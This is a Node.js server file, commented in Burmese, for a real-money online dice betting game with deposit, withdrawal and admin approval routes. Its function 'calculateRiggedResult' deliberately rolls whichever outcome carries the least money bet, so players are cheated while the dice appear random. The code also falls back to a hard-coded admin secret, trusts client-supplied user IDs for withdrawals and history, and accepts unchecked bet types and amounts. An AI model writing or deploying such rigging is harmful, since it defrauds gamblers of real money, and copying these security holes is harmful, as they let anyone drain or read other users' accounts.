require('dotenv').config(); 
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

// --- ၁။ Database ချိတ်ဆက်ခြင်း & Schemas ---
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log('✅ MongoDB Connected Successfully!'))
  .catch(err => console.log('❌ MongoDB Connection Error:', err));

const User = mongoose.model('User', new mongoose.Schema({
  userId: String, 
  balance: { type: Number, default: 10000 }
}));

const BetHistory = mongoose.model('BetHistory', new mongoose.Schema({
  userId: String,
  betType: String,
  amount: Number,
  result: String, 
  payout: Number, 
  createdAt: { type: Date, default: Date.now }
}));

const Transaction = mongoose.model('Transaction', new mongoose.Schema({
  userId: String,
  type: String, // 'deposit' or 'withdraw'
  amount: Number,
  status: { type: String, default: 'pending' }, // 'pending', 'approved', 'rejected'
  createdAt: { type: Date, default: Date.now }
}));

// --- ၂။ Game State ---
let timeLeft = 15;
let gameStatus = 'BETTING'; 
let betPool = { under: 0, equal: 0, over: 0 };
let currentDiceResult = { dice1: 1, dice2: 1, total: 2 };
let globalTrend = []; // နောက်ဆုံးထွက်ခဲ့တဲ့ ပွဲ ၂၀ ရဲ့ ရလဒ် မှတ်ရန် (ဥပမာ ['under', 'over', 'equal'])

let users = {}; 
let userIds = {}; 
let currentRoundBets = {}; 

// Admin Password (Env ထဲမှာ မရှိရင် 'supersecret123' ကို ယာယီသုံးမယ်)
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'supersecret123';

// --- ၃။ Rigged Dice Logic ---
const calculateRiggedResult = () => {
  const { under, equal, over } = betPool;
  if (under === 0 && equal === 0 && over === 0) {
    const d1 = Math.floor(Math.random() * 6) + 1;
    const d2 = Math.floor(Math.random() * 6) + 1;
    return { dice1: d1, dice2: d2, total: d1 + d2 };
  }
  let minType = 'equal'; 
  let minAmount = equal;
  if (under < minAmount) { minType = 'under'; minAmount = under; }
  if (over < minAmount) { minType = 'over'; minAmount = over; }

  let targetTotal;
  if (minType === 'under') targetTotal = Math.floor(Math.random() * 5) + 2; 
  else if (minType === 'over') targetTotal = Math.floor(Math.random() * 5) + 8; 
  else targetTotal = 7; 

  let d1, d2;
  do {
    d1 = Math.floor(Math.random() * 6) + 1;
    d2 = targetTotal - d1;
  } while (d2 < 1 || d2 > 6);
  return { dice1: d1, dice2: d2, total: targetTotal };
};

// --- ၄။ Main Game Loop ---
setInterval(async () => {
  if (gameStatus === 'BETTING') {
    timeLeft--; 
    if (timeLeft === 0) {
      gameStatus = 'ROLLING'; 
      currentDiceResult = calculateRiggedResult();
      const total = currentDiceResult.total;
      
      let winningType = total < 7 ? 'under' : total > 7 ? 'over' : 'equal';

      // Global Trend ထဲ ပေါင်းထည့်မယ် (နောက်ဆုံး ၂၀ ပဲ မှတ်မယ်)
      globalTrend.push(winningType);
      if (globalTrend.length > 20) globalTrend.shift();

      let historyDocs = []; 

      // Payout ရှင်းခြင်း
      for (const [socketId, bet] of Object.entries(currentRoundBets)) {
        if (users[socketId] !== undefined) {
          let winAmount = 0;
          let resultStatus = 'lose';

          if (bet.type === winningType) {
            resultStatus = 'win';
            winAmount = Math.round(winningType === 'equal' ? bet.amount * 5.8 : bet.amount * 2.3); 
            users[socketId] += winAmount; 
            io.to(socketId).emit('betResult', { status: 'win', amountWon: winAmount, newBalance: users[socketId] });
          } else {
            io.to(socketId).emit('betResult', { status: 'lose', amountLost: bet.amount, newBalance: users[socketId] });
          }
          
          io.to(socketId).emit('balanceUpdate', users[socketId]);
          await User.findOneAndUpdate({ userId: userIds[socketId] }, { balance: users[socketId] });

          historyDocs.push({
            userId: userIds[socketId], betType: bet.type, amount: bet.amount, result: resultStatus, payout: winAmount
          });
        }
      }

      if (historyDocs.length > 0) await BetHistory.insertMany(historyDocs);

      // Trend အသစ်ပါ တွဲပို့ပေးမယ်
      io.emit('gameUpdate', { timeLeft, gameStatus, betPool, globalTrend });
      io.emit('diceResult', currentDiceResult); 
      
      setTimeout(() => {
        timeLeft = 15;
        gameStatus = 'BETTING';
        betPool = { under: 0, equal: 0, over: 0 }; 
        currentRoundBets = {}; 
      }, 5000); 
    }
  }
  if (gameStatus === 'BETTING') io.emit('gameUpdate', { timeLeft, gameStatus, betPool, globalTrend });
}, 1000); 

// --- ၅။ Express API Routes (ငွေသွင်း/ထုတ်၊ Approve/Reject နှင့် မှတ်တမ်းများ) ---

// User: ငွေသွင်း Request
app.post('/api/deposit', async (req, res) => {
  const { userId, amount } = req.body;
  if (!userId || !amount || amount <= 0) return res.status(400).json({ error: 'Invalid data' });
  try {
    const tx = new Transaction({ userId, type: 'deposit', amount, status: 'pending' });
    await tx.save();
    res.json({ message: 'Deposit requested successfully', transaction: tx });
  } catch (error) { res.status(500).json({ error: 'Server error' }); }
});

// User: ငွေထုတ် Request
app.post('/api/withdraw', async (req, res) => {
  const { userId, amount } = req.body;
  if (!userId || !amount || amount <= 0) return res.status(400).json({ error: 'Invalid data' });
  try {
    const dbUser = await User.findOne({ userId });
    if (!dbUser || dbUser.balance < amount) return res.status(400).json({ error: 'Insufficient balance' });

    // ငွေထုတ်ရင် Balance ထဲက ချက်ချင်း ဖြတ်ထားမယ် (Pending စစ်နေတုန်း ထပ်မဆော့နိုင်အောင်)
    dbUser.balance -= amount;
    await dbUser.save();

    // ဖြတ်ထားတဲ့ Balance အသစ်ကို User ဆီ ချက်ချင်း Update ပေးမယ်
    const targetSocketId = Object.keys(userIds).find(key => userIds[key] === userId);
    if (targetSocketId) {
      users[targetSocketId] = dbUser.balance;
      io.to(targetSocketId).emit('balanceUpdate', users[targetSocketId]);
    }

    const tx = new Transaction({ userId, type: 'withdraw', amount, status: 'pending' });
    await tx.save();
    res.json({ message: 'Withdraw requested successfully', balance: dbUser.balance, transaction: tx });
  } catch (error) { res.status(500).json({ error: 'Server error' }); }
});

// Admin Middleware: လုံခြုံရေး စစ်ဆေးခြင်း
const isAdmin = (req, res, next) => {
  if (req.headers.admin_secret !== ADMIN_SECRET) return res.status(401).json({ error: 'Unauthorized' });
  next();
};

// Admin: Pending ဖြစ်နေတဲ့ Transaction တွေ ကြည့်ရန်
app.get('/api/admin/transactions/pending', isAdmin, async (req, res) => {
  try {
    const txs = await Transaction.find({ status: 'pending' }).sort({ createdAt: -1 });
    res.json(txs);
  } catch (error) { res.status(500).json({ error: 'Server error' }); }
});

// Admin: Transaction ကို Approve သို့မဟုတ် Reject လုပ်ရန်
app.post('/api/admin/transaction/action', isAdmin, async (req, res) => {
  const { transactionId, action } = req.body; // action က 'approve' သို့မဟုတ် 'reject'
  if (!transactionId || !['approve', 'reject'].includes(action)) return res.status(400).json({ error: 'Invalid action' });

  try {
    const tx = await Transaction.findById(transactionId);
    if (!tx || tx.status !== 'pending') return res.status(400).json({ error: 'Transaction not found or not pending' });

    tx.status = action === 'approve' ? 'approved' : 'rejected';
    await tx.save();

    let dbUser = await User.findOne({ userId: tx.userId });

    // Deposit ကို Approve လုပ်ရင် ပိုက်ဆံပေါင်းပေးမယ် (Reject လုပ်ရင် ဘာမှမလုပ်ဘူး)
    if (tx.type === 'deposit' && action === 'approve') {
      dbUser.balance += tx.amount;
      await dbUser.save();
    }
    // Withdraw ကို Reject လုပ်ရင် ဖြတ်ထားတဲ့ပိုက်ဆံ ပြန်ပေါင်းပေးမယ် (Approve လုပ်ရင် အရင်ကတည်းက ဖြတ်ပြီးသားမို့ ဘာမှလုပ်စရာမလို)
    else if (tx.type === 'withdraw' && action === 'reject') {
      dbUser.balance += tx.amount;
      await dbUser.save();
    }

    // User online ရှိနေရင် Balance Update ချက်ချင်း လုပ်ပေးမယ်
    const targetSocketId = Object.keys(userIds).find(key => userIds[key] === tx.userId);
    if (targetSocketId) {
      users[targetSocketId] = dbUser.balance;
      io.to(targetSocketId).emit('balanceUpdate', users[targetSocketId]);
      // Approve/Reject Notification ပြချင်ရင်
      io.to(targetSocketId).emit('txUpdate', { type: tx.type, status: tx.status, amount: tx.amount });
    }

    res.json({ message: `Transaction ${action}d successfully`, transaction: tx });
  } catch (error) { res.status(500).json({ error: 'Server error' }); }
});

// User: ကိုယ်ပိုင် Betting History ပြန်ကြည့်ရန်
app.get('/api/history/bets/:userId', async (req, res) => {
  try {
    const history = await BetHistory.find({ userId: req.params.userId }).sort({ createdAt: -1 }).limit(50);
    res.json(history);
  } catch (error) { res.status(500).json({ error: 'Server error' }); }
});

// User: ကိုယ်ပိုင် Transaction (ငွေသွင်း/ထုတ်) History ပြန်ကြည့်ရန်
app.get('/api/history/transactions/:userId', async (req, res) => {
  try {
    const txs = await Transaction.find({ userId: req.params.userId }).sort({ createdAt: -1 }).limit(50);
    res.json(txs);
  } catch (error) { res.status(500).json({ error: 'Server error' }); }
});

// --- ၆။ Socket Connection ---
io.on('connection', async (socket) => {
  const customUserId = socket.handshake.query.userId || socket.id;
  
  try {
    let dbUser = await User.findOne({ userId: customUserId });
    if (!dbUser) {
      dbUser = new User({ userId: customUserId, balance: 10000 });
      await dbUser.save();
    }
    users[socket.id] = dbUser.balance; 
    userIds[socket.id] = customUserId; 
    
    socket.emit('balanceUpdate', users[socket.id]);
    socket.emit('gameUpdate', { timeLeft, gameStatus, betPool, globalTrend });
  } catch (err) {
    console.log("DB Error fetching user:", err);
  }

  socket.on('placeBet', async (data) => {
    if (gameStatus === 'BETTING') {
      const betAmount = data.amount;
      if (users[socket.id] >= betAmount) {
        users[socket.id] -= betAmount; 
        socket.emit('balanceUpdate', users[socket.id]); 

        if (!currentRoundBets[socket.id]) currentRoundBets[socket.id] = { type: data.type, amount: 0 };
        currentRoundBets[socket.id].amount += betAmount; 
        betPool[data.type] += betAmount; 

        await User.findOneAndUpdate({ userId: userIds[socket.id] }, { balance: users[socket.id] });
        io.emit('gameUpdate', { timeLeft, gameStatus, betPool, globalTrend });
      } else {
        socket.emit('errorMsg', 'Balance မလောက်ပါ!');
      }
    }
  });

  socket.on('disconnect', () => {
    delete users[socket.id]; 
    delete userIds[socket.id];
    delete currentRoundBets[socket.id];
  });
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});